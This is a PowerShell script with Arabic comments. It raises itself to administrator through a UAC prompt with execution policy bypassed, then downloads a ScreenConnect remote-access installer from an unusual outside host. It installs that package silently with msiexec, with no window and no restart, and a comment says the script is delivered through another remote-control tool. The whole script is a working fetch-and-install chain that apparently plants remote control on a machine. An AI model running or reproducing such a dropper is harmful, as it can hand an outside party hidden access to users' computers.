# ============================================
#  Self-Elevation: يطلب صلاحيات Admin لو مش عنده
# ============================================
$currentUser = [Security.Principal.WindowsIdentity]::GetCurrent()
$principal   = New-Object Security.Principal.WindowsPrincipal($currentUser)
$isAdmin     = $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if (-not $isAdmin) {
    Write-Host "Requesting administrator privileges..."

    # نبني الأمر اللي هيتشغل بصلاحيات Admin
    $scriptPath = $MyInvocation.MyCommand.Path

    # لو السكربت اتنفذ من ملف، نعيد تشغيله
    if ($scriptPath -and (Test-Path $scriptPath)) {
        $psi = New-Object System.Diagnostics.ProcessStartInfo
        $psi.FileName        = "powershell.exe"
        $psi.Arguments       = "-NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`""
        $psi.Verb            = "RunAs"   # ← ده اللي بيفجّر UAC
        $psi.UseShellExecute = $true

        try {
            $proc = [System.Diagnostics.Process]::Start($psi)
            $proc.WaitForExit()
            exit $proc.ExitCode
        }
        catch {
            Write-Host "ERROR: User refused UAC or elevation failed: $($_.Exception.Message)"
            exit 1
        }
    }
    else {
        # لو الكود مش محفوظ في ملف (SimpleHelp بيبعت السكربت كنص)،
        # لازم نلجأ لطريقة تانية
        Write-Host "Script is not running from a file. Cannot self-elevate."
        exit 1
    }
}

Write-Host "Running with administrator privileges. Proceeding..."

# ============================================
#  السكربت الأصلي بعد رفع الصلاحيات
# ============================================
$Url          = "https://matrix.opanam.online/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
$PrimaryDir   = "C:\"
$FallbackDir  = $env:TEMP
$FileName     = "ScreenConnect.ClientSetup.msi"
$LogName      = "ScreenConnect_Install.log"

function Try-Download {
    param($Dir)

    if (-not (Test-Path $Dir)) {
        Write-Host "Directory '$Dir' does not exist."
        return $null
    }

    $target = Join-Path $Dir $FileName

    try {
        Write-Host "Trying to download to: $target"
        Invoke-WebRequest -Uri $Url -OutFile $target -UseBasicParsing -ErrorAction Stop

        if (-not (Test-Path $target)) { throw "File not found after download." }

        $size = (Get-Item $target).Length
        Write-Host "Downloaded size: $size bytes"
        if ($size -lt 100KB) { throw "File too small, likely invalid." }

        return $target
    }
    catch {
        Write-Host "Failed to download to '$Dir': $($_.Exception.Message)"
        if (Test-Path $target) { Remove-Item $target -Force -ErrorAction SilentlyContinue }
        return $null
    }
}

$MsiPath = Try-Download -Dir $PrimaryDir
if (-not $MsiPath) {
    Write-Host "Falling back to TEMP folder..."
    $MsiPath = Try-Download -Dir $FallbackDir
}

if (-not $MsiPath -or -not (Test-Path $MsiPath)) {
    Write-Host "ERROR: Could not download MSI to either C:\ or TEMP."
    exit 1
}

Write-Host "MSI downloaded at: $MsiPath"

# التحقق من توقيع الملف
try {
    $bytes = [System.IO.File]::ReadAllBytes($MsiPath)[0..3]
    $signature = ($bytes | ForEach-Object { $_.ToString("X2") }) -join ""
    if ($signature -ne "D0CF11E0") {
        Write-Host "ERROR: File is not a valid MSI. Signature: $signature"
        exit 1
    }
    Write-Host "File signature OK (valid MSI)"
}
catch {
    Write-Host "ERROR checking file signature: $($_.Exception.Message)"
    exit 1
}

$LogPath = Join-Path (Split-Path $MsiPath -Parent) $LogName
Write-Host "Log will be written to: $LogPath"

try {
    Write-Host "Installing silently..."
    $arguments = "/i `"$MsiPath`" /qn /norestart /L*v `"$LogPath`""
    Write-Host "Command: msiexec.exe $arguments"

    $proc = Start-Process -FilePath "msiexec.exe" `
                          -ArgumentList $arguments `
                          -Wait -PassThru -NoNewWindow

    Write-Host "msiexec ExitCode: $($proc.ExitCode)"

    if ($proc.ExitCode -eq 0 -or $proc.ExitCode -eq 3010) {
        Write-Host "SUCCESS: ScreenConnect installed. ExitCode=$($proc.ExitCode)"
        exit 0
    } else {
        Write-Host "FAILED: ExitCode=$($proc.ExitCode). Check log: $LogPath"
        exit $proc.ExitCode
    }
}
catch {
    Write-Host "ERROR during install: $($_.Exception.Message)"
    exit 1
}
